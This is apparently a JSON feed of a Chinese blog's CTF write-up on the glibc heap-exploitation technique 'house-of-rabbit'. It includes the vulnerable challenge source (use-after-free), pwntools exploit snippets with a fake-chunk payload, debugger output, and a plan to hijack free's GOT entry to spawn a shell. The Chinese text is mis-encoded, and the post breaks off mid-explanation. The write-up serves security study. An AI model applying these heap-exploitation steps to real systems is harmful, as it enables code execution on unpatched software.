{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"house-of-rabbit\" tag",
    "description": "æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "url": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "title": "house-of-rabbit",
            "date_published": "2024-07-26T02:03:08.000Z",
            "content_html": "<h1 id=\"house-of-rabbit\"><a class=\"markdownIt-Anchor\" href=\"#house-of-rabbit\">#</a> house-of-rabbit</h1>\n<p>æ¼æ´æˆå› </p>\n<blockquote>\n<p>å †æº¢å‡ºå†™ã€ <code>use after free</code> ã€ <code>edit after free</code></p>\n</blockquote>\n<p>é€‚ç”¨èŒƒå›´</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> â€”â€” <code>2.31</code></li>\n<li>è¶…è¿‡  <code>0x400</code>  å¤§å°çš„å †åˆ†é…</li>\n<li>å¯ä»¥å†™  <code>fastbin</code>  çš„  <code>fd</code>  æˆ–è€…  <code>size</code>  åŸŸ</li>\n</ul>\n</blockquote>\n<h3 id=\"æ¦‚è¦\"><a class=\"markdownIt-Anchor\" href=\"#æ¦‚è¦\">#</a> æ¦‚è¦ï¼š</h3>\n<p>é€šè¿‡å°† chunk ç½®å…¥ fastbin å†…ï¼Œä¿®æ”¹å…¶ fd æŒ‡å‘ fake chunkï¼Œç„¶ååˆ†é…æˆ–é‡Šæ”¾å¤§å—ï¼Œè§¦å‘ <code>malloc_consolidate</code> ï¼Œæ­¤æ—¶ fake chunk è¢«æ”¾ç½®åˆ° unsortedbin æˆ–å¯¹åº”çš„ smallbins æˆ– largebins å†…</p>\n<h3 id=\"ç»•è¿‡æ£€æµ‹\"><a class=\"markdownIt-Anchor\" href=\"#ç»•è¿‡æ£€æµ‹\">#</a> ç»•è¿‡æ£€æµ‹ï¼š</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">FASTBIN_CONSOLIDATION_THRESHOLD</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token number\">65536UL</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> FASTBIN_CONSOLIDATION_THRESHOLD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">have_fastchunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li><code>2.26</code>  åŠ å…¥äº†  <code>unlink</code>  å¯¹  <code>presize</code>  çš„æ£€æŸ¥</li>\n<li><code>2.27</code>  åŠ å…¥äº†  <code>fastbin</code>  çš„æ£€æŸ¥</li>\n</ul>\n<h3 id=\"åˆ©ç”¨æ€è·¯\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨æ€è·¯\">#</a> åˆ©ç”¨æ€è·¯ï¼š</h3>\n<blockquote>\n<p>è¯¥åˆ©ç”¨æŠ€å·§çš„æ ¸å¿ƒæ˜¯  <code>malloc_consolidate</code>  å‡½æ•°ï¼Œå½“æ£€æµ‹åˆ°æœ‰  <code>fastbin</code>  çš„æ—¶å€™ï¼Œä¼šå–å‡ºæ¯ä¸€ä¸ª  <code>fastbin chunk</code> ï¼Œå°†å…¶æ”¾ç½®åˆ°  <code>unsortedbin</code>  ä¸­ï¼Œå¹¶è¿›è¡Œåˆå¹¶ã€‚</p>\n</blockquote>\n<p>one:</p>\n<ul>\n<li>ç”³è¯·  <code>chunk A</code> ã€ <code>chunk B</code> ï¼Œå…¶ä¸­  <code>chunk A</code>  çš„å¤§å°ä½äº  <code>fastbin</code>  èŒƒå›´</li>\n<li>é‡Šæ”¾  <code>chunk A</code> ï¼Œä½¿å…¶è¿›å…¥åˆ°  <code>fastbin</code></li>\n<li>åˆ©ç”¨  <code>use after free</code> ï¼Œä¿®æ”¹  <code>A-&gt;fd</code>  æŒ‡å‘åœ°å€  <code>X</code> ï¼Œéœ€è¦ä¼ªé€ å¥½  <code>fake chunk</code> ï¼Œä½¿å…¶ä¸æ‰§è¡Œ  <code>unlink</code>  æˆ–è€…ç»•è¿‡  <code>unlink</code></li>\n<li>åˆ†é…è¶³å¤Ÿå¤§çš„  <code>chunk</code> ï¼Œæˆ–è€…é‡Šæ”¾  <code>0x10000</code>  ä»¥ä¸Šçš„  <code>chunk</code> ï¼Œåªè¦èƒ½è§¦å‘  <code>malloc_consolidate</code>  å³å¯</li>\n<li>æ­¤æ—¶  <code>fake chunk</code>  è¢«æ”¾åˆ°äº†  <code>unsortedbin</code> ï¼Œæˆ–è€…è¿›å…¥åˆ°å¯¹åº”çš„  <code>smallbin/largebin</code></li>\n<li>å–å‡º  <code>fake chunk</code>  è¿›è¡Œè¯»å†™å³å¯</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>ç”³è¯·ä¸¤ä¸ª fastbin å¤§å°çš„ chunkï¼ŒAï¼ŒBï¼ŒCã€‚C éš”æ–­ top_chunk</li>\n<li>freeAï¼ŒB</li>\n<li>ä¿®æ”¹ A çš„ fastbin chunk çš„ <code>å¤§å°</code> ï¼Œä½¿å…¶åŒ…è£¹ B</li>\n<li>è§¦å‘ <code>malloc_consolidate</code></li>\n</ul>\n<h3 id=\"ä¾‹é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ä¾‹é¢˜\">#</a> ä¾‹é¢˜ï¼š</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG91c2Utb2YtcmFiYml0\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/house-of-rabbit</span></p>\n<p><img data-src=\"/img/house-of-rabbit/image-20240726081440063.png\" alt=\"image-20240726081440063\"></p>\n<blockquote>\n<p>é¢˜ç›®æºç æˆ‘ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼Œæ‰€ä»¥ç›´æ¥æ”¾æºç å§ã€‚</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v3 <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Add>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lu\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA00000LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">13337</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>flags <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFFFFFFFFFFFFF70LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            flags <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>v3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"idx>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">&amp;&amp;</span> ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾åªèƒ½ç”³è¯· 0x10ã€0x80ã€0xA00000 å’Œ 0xFFFFFFFFFFFFFF70 å¤§å°çš„ chunk å—ï¼Œæœ€å¤šç”³è¯· 9 æ¬¡</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">del</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Del>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>å­˜åœ¨ uaf æ¼æ´</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">edt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Edt>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"addr>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>fake<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>å¯ä»¥å¾€ fake åœ°å€å¤„å†™ï¼Œå› æ­¤å¯ä»¥åœ¨ fake å¤„ä¼ªé€  fakechunkï¼Œå¹¶å¯ä»¥ä¿®æ”¹ fd</p>\n<p>å¹¶ä¸”ç¨‹åºå­˜åœ¨ system</p>\n<ol>\n<li>åˆ©ç”¨  <code>malloc consolidation</code>  æœºåˆ¶å»åœ¨ buffer ä¸­è·å¾—ä¸€ä¸ª unsortedbin chunkï¼Œè®¡ç®—å¥½ä½ç½®ï¼Œä½¿å¾—ç”³è¯·å·¨å¤§å†…å­˜åï¼Œåˆ‡å‰²ä¸‹æ¥çš„ chunk åˆšå¥½ä½äºæŒ‡é’ˆæ•°ç»„è¾¹ä¸Š</li>\n<li>é€šè¿‡ä¿®æ”¹ bufferï¼Œä½¿å…¶å¤§å°å°äº <code>0xA00010</code>  ä¸”å¤§äº <code>0x80000</code> ï¼Œä½¿è¯¥ chunk é€šè¿‡ sort è¿‡ç¨‹è¿›å…¥ largebin</li>\n<li>ç”³è¯·å·¨å¤§å†…å­˜å¾—åˆ°åˆ†å‰²åçš„ chunk ä½äºæŒ‡é’ˆæ•°ç»„è¾¹ä¸Šï¼Œä¿®æ”¹æŒ‡é’ˆä¸º got [â€˜freeâ€™]ï¼Œå‘å…¶ä¸­å†™å…¥å†…å­˜ plt [â€˜systemâ€™]ï¼ŒåŠ«æŒ free å‡½æ•°ï¼Œç„¶åé‡Šæ”¾ä¸€ä¸ªå†™æœ‰ <code>/bin/sh</code>  çš„ chunkï¼Œæ‹¿åˆ° shell</li>\n</ol>\n<p>è¿‡ç¨‹å’ŒåŸå› ä¸€æ­¥ä¸€æ­¥çš„è®²å§ï¼š</p>\n<h5 id=\"1malloc-consolidation\"><a class=\"markdownIt-Anchor\" href=\"#1malloc-consolidation\">#</a> <strong>1.malloc consolidation</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0x10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è§¦å‘ <code>malloc consolidation</code>  æ•ˆæœå¦‚ä¸‹ï¼š</p>\n<p>add ä¹‹å‰</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000â”‚  0x6012e0 (ptr) â—‚â€” 0x7ffff6dff010<br>\n01:0008â”‚  0x6012e8 (ptr+8) â€”â–¸ 0x602420 â€”â–¸ 0x601350 (fake+16) â—‚â€” 0x0<br>\n02:0010â”‚  0x6012f0 (ptr+16) â€”â–¸ 0x602420 â€”â–¸ 0x601350 (fake+16) â—‚â€” 0x0<br>\n03:0018â”‚  0x6012f8 (ptr+24) â—‚â€” 0x0<br>\nâ€¦ â†“     11 skipped<br>\n0f:0078â”‚  0x601358 (fake+24) â—‚â€” 0x11<br>\n10:0080â”‚  0x601360 (fake+32) â—‚â€” 0x0<br>\n11:0088â”‚  0x601368 (fake+40) â—‚â€” 0x1<br>\n12:0090â”‚  0x601370 â—‚â€” 0x0<br>\n13:0098â”‚  0x601378 â—‚â€” 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Free chunk (fastbins) | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0x20 (with flag bits: 0x21)<br>\nfd: 0x601350</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x602430<br>\nSize: 0xa20bd0 (with flag bits: 0xa20bd1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\n0x20: 0x602410 â€”â–¸ 0x601350 (fake+16) â—‚â€” 0x0</p>\n</blockquote>\n<p>add ä¹‹å</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000â”‚  0x6012e0 (ptr) â—‚â€” 0x7ffff6dff010<br>\n01:0008â”‚  0x6012e8 (ptr+8) â€”â–¸ 0x602420 â€”â–¸ 0x601333 â—‚â€” 0x0<br>\nâ€¦ â†“     2 skipped<br>\n04:0020â”‚  0x601300 (ptr+32) â—‚â€” 0x0<br>\nâ€¦ â†“     10 skipped<br>\n0f:0078â”‚  0x601358 (fake+24) â—‚â€” 0x11<br>\n10:0080â”‚  0x601360 (fake+32) â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â€”â–¸ 0x1002420 â—‚â€” 0x0<br>\n11:0088â”‚  0x601368 (fake+40) â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â€”â–¸ 0x1002420 â—‚â€” 0x0<br>\n12:0090â”‚  0x601370 â—‚â€” 0x0<br>\n13:0098â”‚  0x601378 â—‚â€” 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Allocated chunk | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0xa00010 (with flag bits: 0xa00011)</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x1002420<br>\nSize: 0x20be0 (with flag bits: 0x20be1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) â€”â–¸ 0x7ffff7bc4b78 (main_arena+88) â—‚â€” 0x601350</p>\n</blockquote>\n<p>åŸå› ï¼š</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-rabbit/image-20240726091641543.png\" alt=\"image-20240726091641543\"></p>\n<p>æˆ‘ä»¬å¯ä»¥çœ‹è§</p>\n<blockquote>\n<p>0x00:pack(0)+pack(0x00),<br>\n0x10:pack(0)+pack(0x11),<br>\n0x20:pack(0)+pack(1)</p>\n</blockquote>\n<p>fake_chunk è®¾ç½®çš„æ˜¯è¿™æ ·ã€‚è¿™éœ€è¦è®©æˆ‘ä»¬äº†è§£ä¸€ä¸‹ <code>malloc consolidation</code>  çš„è¿‡ç¨‹</p>\n<blockquote>\n<ol>\n<li>ä» fastbin ä¸­ä¾æ¬¡å–å‡º fastbin 